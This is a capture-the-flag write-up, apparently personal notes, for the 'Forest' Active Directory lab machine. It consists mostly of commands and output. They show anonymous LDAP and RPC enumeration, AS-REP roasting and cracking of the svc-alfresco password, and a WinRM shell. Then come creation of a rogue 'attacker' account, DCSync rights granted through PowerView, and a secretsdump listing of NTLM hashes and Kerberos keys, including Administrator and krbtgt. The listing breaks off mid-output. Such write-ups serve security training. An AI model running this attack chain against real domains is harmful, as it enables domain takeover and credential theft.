## Forest

### Lab Details 

- Difficulty: Easy
- Type: Active Directory, Windows

#### Enumeration

```bash
$ python3 ./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.95.210
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 28 users: 

cn: Guest

cn: DefaultAccount

<SNIP>

cn: Sebastien Caron
userPrincipalName: sebastien@htb.local

cn: Lucinda Berger
userPrincipalName: lucinda@htb.local

cn: Andy Hislip
userPrincipalName: andy@htb.local

cn: Mark Brandt
userPrincipalName: mark@htb.local

cn: Santi Rodriguez
userPrincipalName: santi@htb.local
```

```bash
$ enum4linux-ng htb.local -oY out
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... htb.local
[*] Username ......... ''
[*] Random Username .. 'lqtxogza'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on htb.local    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for htb.local    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: htb.local

 ========================================================
|    NetBIOS Names and Workgroup/Domain for htb.local    |
 ========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ======================================
|    SMB Dialect Check on htb.local    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ========================================================
|    Domain Information via SMB session for htb.local    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FOREST
NetBIOS domain name: HTB
DNS domain: htb.local
FQDN: FOREST.htb.local
Derived membership: domain member
Derived domain: HTB

 ======================================
|    RPC Session Check on htb.local    |
 ======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ================================================
|    Domain Information via RPC for htb.local    |
 ================================================
[+] Domain: HTB
[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
[+] Membership: domain member

 ============================================
|    OS Information via RPC for htb.local    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows Server 2016 Standard 14393
OS version: '10.0'
OS release: '1607'
OS build: '14393'
Native OS: Windows Server 2016 Standard 14393
Native LAN manager: Windows Server 2016 Standard 6.3
Platform id: null
Server type: null
Server type string: null

 ==================================
|    Users via RPC on htb.local    |
 ==================================
[*] Enumerating users via 'querydispinfo'
[+] Found 31 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 31 user(s) via 'enumdomusers'
[+] After merging user results we have 31 user(s) total:
'1123':
  username: $331000-VK4ADACQNUCA
  name: (null)
  acb: '0x00020015'
  description: (null)
'1124':
  username: SM_2c8eef0a09b545acb
  name: Microsoft Exchange Approval Assistant
  acb: '0x00020011'
  description: (null)
'1125':
  username: SM_ca8c2ed5bdab4dc9b
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1126':
  username: SM_75a538d3025e4db9a
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1127':
  username: SM_681f53d4942840e18
  name: Discovery Search Mailbox
  acb: '0x00020011'
  description: (null)
'1128':
  username: SM_1b41c9286325456bb
  name: Microsoft Exchange Migration
  acb: '0x00020011'
  description: (null)
'1129':
  username: SM_9b69f1b9d2cc45549
  name: Microsoft Exchange Federation Mailbox
  acb: '0x00020011'
  description: (null)
'1130':
  username: SM_7c96b981967141ebb
  name: E4E Encryption Store - Active
  acb: '0x00020011'
  description: (null)
'1131':
  username: SM_c75ee099d0a64c91b
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1132':
  username: SM_1ffab36a2f5f479cb
  name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
  acb: '0x00020011'
  description: (null)
'1134':
  username: HealthMailboxc3d7722
  name: HealthMailbox-EXCH01-Mailbox-Database-1118319013
  acb: '0x00000210'
  description: (null)
'1135':
  username: HealthMailboxfc9daad
  name: HealthMailbox-EXCH01-001
  acb: '0x00000210'
  description: (null)
'1136':
  username: HealthMailboxc0a90c9
  name: HealthMailbox-EXCH01-002
  acb: '0x00000210'
  description: (null)
'1137':
  username: HealthMailbox670628e
  name: HealthMailbox-EXCH01-003
  acb: '0x00000210'
  description: (null)
'1138':
  username: HealthMailbox968e74d
  name: HealthMailbox-EXCH01-004
  acb: '0x00000210'
  description: (null)
'1139':
  username: HealthMailbox6ded678
  name: HealthMailbox-EXCH01-005
  acb: '0x00000210'
  description: (null)
'1140':
  username: HealthMailbox83d6781
  name: HealthMailbox-EXCH01-006
  acb: '0x00000210'
  description: (null)
'1141':
  username: HealthMailboxfd87238
  name: HealthMailbox-EXCH01-007
  acb: '0x00000210'
  description: (null)
'1142':
  username: HealthMailboxb01ac64
  name: HealthMailbox-EXCH01-008
  acb: '0x00000210'
  description: (null)
'1143':
  username: HealthMailbox7108a4e
  name: HealthMailbox-EXCH01-009
  acb: '0x00000210'
  description: (null)
'1144':
  username: HealthMailbox0659cc1
  name: HealthMailbox-EXCH01-010
  acb: '0x00000210'
  description: (null)
'1145':
  username: sebastien
  name: Sebastien Caron
  acb: '0x00000210'
  description: (null)
'1146':
  username: lucinda
  name: Lucinda Berger
  acb: '0x00000210'
  description: (null)
'1147':
  username: svc-alfresco
  name: svc-alfresco
  acb: '0x00010210'
  description: (null)
'1150':
  username: andy
  name: Andy Hislip
  acb: '0x00000210'
  description: (null)
'1151':
  username: mark
  name: Mark Brandt
  acb: '0x00000210'
  description: (null)
'1152':
  username: santi
  name: Santi Rodriguez
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: Administrator
  acb: '0x00000010'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00000011'
  description: Key Distribution Center Service Account
'503':
  username: DefaultAccount
  name: (null)
  acb: '0x00000215'
  description: A user account managed by the system.

 ===================================
|    Groups via RPC on htb.local    |
 ===================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 29 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 38 group(s) via 'enumdomgroups'
[+] After merging groups results we have 72 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1104':
  groupname: Organization Management
  type: domain
'1105':
  groupname: Recipient Management
  type: domain
'1106':
  groupname: View-Only Organization Management
  type: domain
'1107':
  groupname: Public Folder Management
  type: domain
'1108':
  groupname: UM Management
  type: domain
'1109':
  groupname: Help Desk
  type: domain
'1110':
  groupname: Records Management
  type: domain
'1111':
  groupname: Discovery Management
  type: domain
'1112':
  groupname: Server Management
  type: domain
'1113':
  groupname: Delegated Setup
  type: domain
'1114':
  groupname: Hygiene Management
  type: domain
'1115':
  groupname: Compliance Management
  type: domain
'1116':
  groupname: Security Reader
  type: domain
'1117':
  groupname: Security Administrator
  type: domain
'1118':
  groupname: Exchange Servers
  type: domain
'1119':
  groupname: Exchange Trusted Subsystem
  type: domain
'1120':
  groupname: Managed Availability Servers
  type: domain
'1121':
  groupname: Exchange Windows Permissions
  type: domain
'1122':
  groupname: ExchangeLegacyInterop
  type: domain
'1133':
  groupname: $D31000-NSEL5BRJ63V7
  type: domain
'1148':
  groupname: Service Accounts
  type: domain
'1149':
  groupname: Privileged IT Accounts
  type: domain
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'5101':
  groupname: test
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'581':
  groupname: System Managed Accounts Group
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 ===================================
|    Shares via RPC on htb.local    |
 ===================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ======================================
|    Policies via RPC for htb.local    |
 ======================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

 ======================================
|    Printers via RPC for htb.local    |
 ======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 5.77 seconds
```

```basg
$ GetNPUsers.py htb.local/"svc-alfresco" -request -no-pass -dc-ip 10.129.95.210
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:21ab0283dbd73b7b951f95a60b69c9e7$db4b5d5c6f75aa4ec7634093390cebca5fbe82508941bc2422307c25f5d6e7487a8764c7407e1d90d8c2556d55c9cddf2ddbe3eaac9e9b0f8ead605bd77ce430cd366f28d70e7274b9084832713a371007fef4c395ea42d662a8327eabb43e02ca5c64cd3a4d07b86585b6d262faabf251356781b90cd090c9ebef22bc3b5305c560750c5f0be75e790963adf0ed2591da8b17b9d181b44ec46b444198c00867c2c7cc7d79e453a811e015857032ee96158417431bdd74393cbc2eda4a519efd45faf77e72dddce6d36ef0852703091f763a7f499f8c551cf5586961108a370023f7700407fc
```

```bash
$ hashcat -m 18200 -a 0 -w 3 -O svc-alfresco /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$svc-alfresco@HTB.LOCAL:21ab0283dbd73b7b951f95a60b69c9e7$db4b5d5c6f75aa4ec7634093390cebca5fbe82508941bc2422307c25f5d6e7487a8764c7407e1d90d8c2556d55c9cddf2ddbe3eaac9e9b0f8ead605bd77ce430cd366f28d70e7274b9084832713a371007fef4c395ea42d662a8327eabb43e02ca5c64cd3a4d07b86585b6d262faabf251356781b90cd090c9ebef22bc3b5305c560750c5f0be75e790963adf0ed2591da8b17b9d181b44ec46b444198c00867c2c7cc7d79e453a811e015857032ee96158417431bdd74393cbc2eda4a519efd45faf77e72dddce6d36ef0852703091f763a7f499f8c551cf5586961108a370023f7700407fc:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:21ab0283dbd73b...0407fc
Time.Started.....: Sun Sep 28 02:34:15 2025 (2 secs)
Time.Estimated...: Sun Sep 28 02:34:17 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1866.2 kH/s (0.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4086689/14344385 (28.49%)
Rejected.........: 929/4086689 (0.02%)
Restore.Point....: 4084641/14344385 (28.48%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: s469244 -> s32393
```
#### Initial Foothold 
```bash
$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```
#### Lateral Movement (If any)

#### Privilege Escalation

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
È Getting Leaked Handlers, it might take some time...
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)
   at winPEAS.Native.Classes.UNICODE_STRING.Dispose(Boolean disposing)
    Handle: 1672(key)
    Handle Owner: Pid is 3196(winPEASx86) with owner: svc-alfresco
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows\currentversion\explorer\folderdescriptions\{e25b5812-be88-4bd9-94b0-29233477b6c3}\propertybag
   =================================================================================================

    Handle: 1740(key)
    Handle Owner: Pid is 3196(winPEASx86) with owner: svc-alfresco
    Reason: AllAccess
    Registry: HKLM\software\microsoft\windows\currentversion\explorer\folderdescriptions\{fd228cb7-ae11-4ae3-864c-16f3910ab8fe}\propertybag
   =================================================================================================
```

```bash
$ bloodhound-python -u "svc-alfresco" -p "s3rvice" -d htb.local -ns 10.129.95.210 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 02S

$ ls
20250928024927_groups.json  20250928025041_computers.json   20250928025041_domains.json  20250928025041_groups.json  20250928025041_users.json
20250928024927_users.json   20250928025041_containers.json  20250928025041_gpos.json     20250928025041_ous.json

$bloodhound
```
- upload the `json` files to `bloodhound`
- run `Find Shortest Paths to Domain Admins` 
![[bloodhound shortest path to DA.png]]
- we can see that `svc-alfresco` belongs to `Privileged IT Accounts` group
- `Privileged IT Accounts` group is part of `Account Operators` Group
![[bloodhound group.png]]
- `Account Operators` group allows us to create and modify users and add them to non-protected groups
- from the output of `Find Shortest Paths to Domain Admins` we see `Exchange Windows Permissions` group has `WriteDacl` permission of the domain controller
- with `WriteDacl` we can add ACLs to an object which
- we can attempt to add a user to `Exchange Windows Permissions` group and give them DCSync privileges. 
- creating user `attacker` and adding `attacker` to `Exchange windows Permissions` and `Remote Management Users` groups
- `Exchange windows Permissions` gives `WriteDacl` access
- `Remote Management Users` gives `winrm` access
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> net user attacker attacker /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange windows Permissions" attacker /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" attacker /add
The command completed successfully.
```
- upload `Powerview.ps1` to target
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
                                        
Info: Uploading /home/ch4os1/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```
- give `DCsync` privilege to `attacker`
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'attacker' -asplain -force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential('htb\attacker', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity attacker -Credential $cred -Rights DCSync
```
- perform `DCSync`
```bash
$ impacket-secretsdump htb/attacker@10.129.95.210
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
attacker:10101:aad3b435b51404eeaad3b435b51404ee:9306168c2cc4fd6a0eb3849114f58098:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:7c779a615e96384544272d0aa012903b:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
